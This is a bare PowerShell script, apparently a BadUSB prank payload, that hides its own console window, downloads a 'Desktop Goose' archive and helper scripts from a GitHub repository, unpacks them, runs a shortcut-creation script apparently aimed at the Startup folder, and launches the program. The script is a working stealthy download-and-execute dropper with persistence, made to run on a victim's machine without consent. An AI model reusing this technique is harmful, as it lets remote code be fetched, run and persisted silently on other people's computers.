$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

$startupFolder = "C:\Users\$Env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
$saveFolder = "C:\Users\$Env:username\goose"

New-Item -Path $saveFolder -ItemType Directory

Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/DesktopGoose.zip" -OutFile "$saveFolder\DesktopGoose.zip"
Expand-Archive -LiteralPath "$saveFolder\DesktopGoose.zip" -DestinationPath "$saveFolder\DesktopGoose"

Remove-Item "$saveFolder\DesktopGoose.zip"

Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/createShortcut.ps1" -OutFile "$saveFolder\createShortcut.ps1"

Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/removeGoose.ps1" -OutFile "$saveFolder\removeGoose.ps1"

Start-Process powershell "$saveFolder\createShortcut.ps1"

& "$saveFolder\DesktopGoose\GooseDesktop.exe"
